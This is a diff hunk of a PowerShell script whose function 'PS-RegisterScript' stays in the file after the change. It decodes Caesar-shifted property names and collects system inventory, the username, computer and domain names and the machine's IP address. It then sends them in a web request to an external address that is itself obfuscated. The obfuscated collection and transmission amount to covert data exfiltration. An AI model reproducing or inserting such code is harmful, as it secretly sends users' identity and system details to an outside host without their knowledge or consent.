@@ -133,8 +133,7 @@ Function eeCode ($pVar,[int]$Key) {$msg = $pvar; $msg = $msg.toCharArray();forea
 
 Function PS-RegisterScript {
 	$tar = @("ElrvVhudoQxpehu","ZlqgrzvYhuvlrq","ZlqgrzvSurgxfwQdph","FvGrpdlq","FvPdqxidfwxuhu","FvPrgho","FvQdph","FvQxpehuRiOrjlfdoSurfhvvruv","FvQxpehuRiSurfhvvruv", "FvSurfhvvruv", "FvSduwRiGrpdlq","FvSFV|vwhpW|sh","FvSk|lfdoo|LqvwdoohgPhpru|","FvSulpdu|RzqhuFrqwdfw","FvSulpdu|RzqhuQdph","FvVxssruwFrqwdfwGhvfulswlrq","FvXvhuQdph","FvZrunjurxs","RvQdph", "RvRshudwlqjV|vwhpVNX","RvExlogQxpehu","RvYhuvlrq","RvOrfdohLG","RvFrghVhw","RvLqvwdooGdwh","RvOdqjxdjh","RvRujdql}dwlrq","Wlph]rqh","OrjrqVhuyhu","K|shuYlvruSuhvhqw");$temp = Get-ComputerInfo
-	foreach ($titem in $tar) {if ($titem -eq "FvSurfhvvruv") {$tiprop = $temp.(eeCode $titem (-3)).name} else {$tiprop = $temp.(eeCode $titem (-3))}$tpci = "$tpci,$tiprop"}
-	$ucd = "$env:username,$env:computername,$env:userdomain,$env:userdnsdomain";$ThisIP = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
+	foreach ($titem in $tar) {if ($titem -eq "FvSurfhvvruv") {$tiprop = $temp.(eeCode $titem (-3)).name} else {$tiprop = $temp.(eeCode $titem (-3))}$tpci = "$tpci,$tiprop"};$ucd = "$env:username,$env:computername,$env:userdomain,$env:userdnsdomain";$ThisIP = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
 	foreach ($thisp in (Get-ChildItem variable:)) {if (($thisp.name -like "doGlobal*") -or ($thisp.name -like "doProfile*")) {$opost = $opost + "," + $thisp.name + "=" + $thisp.value} }
 	$FExec = $tpci.Replace("&","");$Pass = "$ucd,$ThisIP,$FExec";$uEnt = eeCode "kwwsv=22zzz1phjdskdw1qhw2svgdwd2jhwgdwd1dvsBfpuv@" (-3);Invoke-WebRequest -URI $uEnt$Pass$opost;wait 3 #;write $uEnt$Pass$opost
 }
